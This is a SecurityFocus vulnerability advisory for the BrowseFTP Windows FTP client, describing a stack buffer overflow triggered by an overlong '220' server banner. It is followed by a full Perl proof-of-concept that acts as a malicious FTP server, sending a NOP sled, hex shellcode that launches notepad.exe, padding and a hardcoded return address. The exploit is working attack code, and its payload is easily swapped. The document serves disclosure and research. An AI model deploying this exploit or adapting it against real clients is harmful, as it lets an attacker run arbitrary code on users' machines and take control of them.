source: http://www.securityfocus.com/bid/3781/info

BrowseFTP is an ftp client that runs on various Microsoft Windows operating systems.

An issue has been reported which could allow for a malicious ftp server to execute arbitrary code on a BrowseFTP client user.

This is acheivable when a BrowseFTP user connects to an ftp host, if the FTP server '220' response is of excessive length. The stack-based overflow condition can allow for malicious administrators to execute arbitrary code on (and gain control of) client hosts. It is also possible to crash the client. 

#!/usr/local/bin/perl

#------------------------------------------------------------------------
# Browse FTP exploit( run under inetd )
# written by Kanatoko 
# http://www.jumperz.net/
#------------------------------------------------------------------------
$|=1;

	#egg written by UNYUN (http://www.shadowpenguin.org/)
$egg  = "\xEB\x22\x5B\x53\x32\xE4\x83\xC3\x0B\x88\x23\xB8\x24\x98\x01\x78";
$egg .= "\xFF\xD0\x33\xC0\x50\xB4\x78\xC1\xE0\x10\x33\xDB\x66\xBB\x04\x55";
$egg .= "\x0B\xC3\xFF\xD0\xE8\xD9\xFF\xFF\xFF";
$egg .= "notepad.exe";

	#018DFB20
$ret = "\x20\xFB\x8D\x01";

$buf = "\x90" x 2428;
$buf .= $egg;
$buf .= "A" x 299;
$buf .= $ret;

print "220 $buf\r\n";

